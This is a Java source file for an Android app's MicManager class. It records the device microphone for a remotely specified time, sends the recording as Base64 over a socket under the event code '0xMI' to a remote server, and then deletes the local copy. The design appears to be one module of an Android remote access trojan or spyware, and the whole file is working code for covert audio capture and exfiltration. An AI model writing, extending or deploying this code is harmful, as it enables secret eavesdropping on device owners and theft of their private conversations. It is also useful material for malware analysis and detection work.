package com.fason.app.features.mic;

import android.Manifest;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;

import com.fason.app.core.FasonApp;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.service.MainService;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

// Microphone recording manager
public final class MicManager {

    private static MediaRecorder recorder;
    private static File audioFile;
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static final ExecutorService exec = Executors.newSingleThreadExecutor();
    private static final AtomicBoolean recording = new AtomicBoolean(false);
    private static Runnable stopTask;

    private MicManager() {}

    // Check if recording
    public static boolean isRecording() {
        return recording.get();
    }

    // Start recording
    public static void start(int seconds) {
        if (seconds <= 0 || seconds > 3600) return;

        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
            sendError("No mic permission");
            return;
        }

        stop();

        if (!recording.compareAndSet(false, true)) return;

        // Update service type for Android 14+
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }

        try {
            File cache = FasonApp.getContext().getCacheDir();
            if (cache == null) {
                recording.set(false);
                return;
            }

            audioFile = File.createTempFile("rec_", ".mp4", cache);

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setAudioSamplingRate(44100);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            stopTask = () -> {
                stop();
                sendAudio();
            };
            handler.postDelayed(stopTask, seconds * 1000L);

            sendStatus("recording", seconds);

        } catch (Exception e) {
            recording.set(false);
            sendError("Recording failed: " + e.getMessage());
            releaseType();
        }
    }

    // Stop recording
    public static void stop() {
        if (stopTask != null) {
            handler.removeCallbacks(stopTask);
            stopTask = null;
        }

        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
            }
        } catch (Exception ignored) {}

        recording.set(false);
        releaseType();
    }

    // Release service type
    private static void releaseType() {
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.releaseType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }
    }

    // Send audio file
    private static void sendAudio() {
        exec.execute(() -> {
            try {
                if (audioFile == null || !audioFile.exists()) {
                    sendError("Audio file not found");
                    return;
                }

                byte[] data = new byte[(int) audioFile.length()];
                try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(audioFile))) {
                    bis.read(data);
                }

                JSONObject obj = new JSONObject();
                obj.put("file", true);
                obj.put("name", audioFile.getName());
                obj.put("buffer", Base64.encodeToString(data, Base64.NO_WRAP));
                obj.put("size", data.length);
                obj.put("timestamp", System.currentTimeMillis());

                SocketClient.getInstance().getSocket().emit("0xMI", obj);

                if (audioFile != null) {
                    audioFile.delete();
                    audioFile = null;
                }
            } catch (Exception e) {
                sendError("Send failed: " + e.getMessage());
            }
        });
    }

    // Send status
    private static void sendStatus(String status, int duration) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("status", status);
            obj.put("duration", duration);
            obj.put("timestamp", System.currentTimeMillis());
            SocketClient.getInstance().getSocket().emit("0xMI", obj);
        } catch (Exception ignored) {}
    }

    // Send error
    private static void sendError(String error) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("error", true);
            obj.put("message", error);
            obj.put("timestamp", System.currentTimeMillis());
            SocketClient.getInstance().getSocket().emit("0xMI", obj);
        } catch (Exception ignored) {}
    }

    // Alias for start
    public static void startRecording(int seconds) {
        start(seconds);
    }
}
